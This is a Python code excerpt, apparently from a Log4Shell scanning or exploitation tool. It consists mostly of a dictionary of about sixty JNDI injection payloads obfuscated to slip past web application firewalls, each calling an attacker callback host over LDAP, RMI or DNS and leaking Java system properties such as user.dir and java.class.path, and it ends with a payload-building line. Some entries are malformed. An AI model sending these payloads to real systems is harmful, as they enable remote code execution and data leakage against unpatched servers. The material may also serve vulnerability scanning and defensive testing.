...
waf_bypass_payloads = {
	'pl0': '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl1': '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl2': '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}',
	'pl3': '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl4': '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl5': '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}',
	'pl6': '${${::-j}ndi:rmi://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl7': '${${::-j}ndi:rmi://{{callback_host}}/{{random}}}',
	'pl8': '${${::-j}ndi:rmi://{{verb}}.${sys:user.dir}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl9': '${${::-j}ndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl10': '${${::-j}ndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}',
	'pl11': '${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host/{{random}}}',
	'pl12': '${${lower:${lower:jndi}}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl13': '${${lower:${lower:jndi}}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}',
	'pl14': '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl15': '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}',
	'pl16': '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl17': '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}',
	'pl18': '${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl19': '${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}',
	'pl20': '${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl21': '${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}',
	'pl22': '${${lower:jndi}:${lower:rmi}://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl23': '${${lower:jndi}:${lower:rmi}://{{callback_Host}}/{{random}}}',
	'pl24': '${${lower:jndi}:${lower:rmi}://{{verb}}.${main:0}{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl25': '${${lower:jndi}:${lower:rmi}://{{verb}}.${sys:java.class.path}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl26': '${${lower:jndi}:${lower:rmi}://{{verb}}.${sys:java.class.path}{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl27': '${${lower:jndi}:${lower:rmi}://{{verb}}.${sys:user.dir}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl28': '${${lower:jndi}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl29': '${${lower:jndi}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}',
	'pl30': '${${lower:jndi}:${lower:rmi}://{{verb}}.x${sys:java.class.path}{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl31': '${jndi:dns://${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl32': '${jndi:dns://${sys:java.class.path}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl33': '${jndi:dns://${sys:java.version}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl34': '${jndi:dns://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl35': '${jndi:dns://${sys:user.name}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl36': '${jndi:dns://{{callback_host}}}',
	'pl37': '${jndi:dns://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl38': '${jndi:dns://x${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}}',
	'pl39': '${jndi:dns://x${sys:java.class.path}..{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl40': '${jndi:dns://x${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl41': '${jndi:ldap://${main:0}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl42': '${jndi:ldap://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl43': '${jndi:ldap://x${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}}',
	'pl44': '${jndi:rmi://${sys:user.dir}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl45': '${jndi:rmi://{{callback_host}}}',
	'pl46': '${jndi:rmi://{{verb}}.${main:0}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl47': '${jndi:rmi://{{verb}}.${sys:java.class.path}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl48': '${jndi:rmi://{{verb}}.${sys:user.dir}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl49': '${jndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl50': '${jndi:rmi://{{verb}}.x${sys:java.class.path}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}',
	'pl51': '${jndi:rmi://x${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}}',
	'pl52': '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/poc}',
	'pl53': '${${::-j}ndi:rmi://{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}',
	'pl54': '${jndi:rmi://{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}}',
	'pl55': '${${lower:jndi}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/xyy}',
	'pl56': '${${lower:${lower:jndi}}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}',
	'pl57': '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}',
	'pl58': '${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}',
	'pl59': '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}:1389/{{random}}}',
	'pl60': '${${::-j}ndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}:1389/{{random}}}',
}
...
#    payload = '${jndi:ldap://%s.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.%s/%s}' % (parsed_url["host"], callback_host, random_string)
    payload = '${jndi:ldap://${main:0}.%s.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.%s/%s}' % (parsed_url["host"], callback_host, random_string)
